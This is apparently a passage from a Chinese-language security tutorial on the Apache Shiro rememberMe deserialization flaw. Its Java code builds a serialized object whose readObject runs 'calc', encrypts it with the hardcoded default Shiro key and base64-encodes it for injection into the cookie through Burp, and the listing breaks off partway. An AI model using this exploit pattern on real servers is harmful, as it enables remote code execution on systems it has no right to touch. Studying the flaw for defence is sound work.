下面演示了执行恶意代码(**打开计算器**)的程序源码，运行Demo1代码之后生成的字符串通过burp抓包放到cookie的rememberMe中

```python
public class Demo1 extends AesUtils {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        Test test = new Test();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        // 1. 序列化恶意对象
        // 创建对象输出流，用于序列化对象
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(test);
        // 2. 加密而已对象（byte数组）
        AesUtils aesUtils = new AesUtils();
        byte[] encryptByte = aesUtils.encrypt(baos.toByteArray());
        // 3. 转为base64
        String base64 = Base64.encodeToString(encryptByte);
        System.out.println(base64);
    }
}
class Test implements Serializable {
    private void readObject(ObjectInputStream in) {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
public class AesUtils {
    private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
    private Serializer<PrincipalCollection> serializer = new DefaultSerializer();
    private CipherService cipherService = new AesCipherService();
    private byte[] encryptionCipherKey;
    private byte[] decryptionCipherKey;
    public AesUtils() {
        this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
    }
    protected byte[] encrypt(byte[] serialized) {
        byte[] value = serialized;
        CipherService cipherService = this.getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCipherKey());
            value = byteSource.getBytes();
        }
        return value;
    }
```


结果如下：

![image-20241029094007988](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029094007988.png)
